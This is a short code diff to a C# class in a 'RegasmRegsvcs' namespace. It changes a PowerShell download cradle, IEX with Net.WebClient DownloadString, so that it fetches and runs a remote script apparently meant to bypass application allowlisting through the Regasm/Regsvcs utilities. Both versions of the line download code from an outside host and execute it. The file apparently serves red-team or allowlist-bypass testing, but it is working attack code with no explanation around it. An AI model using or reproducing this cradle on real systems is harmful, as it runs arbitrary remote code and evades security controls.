@@ -17,7 +17,7 @@ namespace RegasmRegsvcs
         {
             PowerShell ps = PowerShell.Create();
             ps.AddCommand("Invoke-Expression");
-            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/RegasmRegsvcs/RegasmRegsvcsByapss.ps1')");
             ps.Invoke();
         }
     }
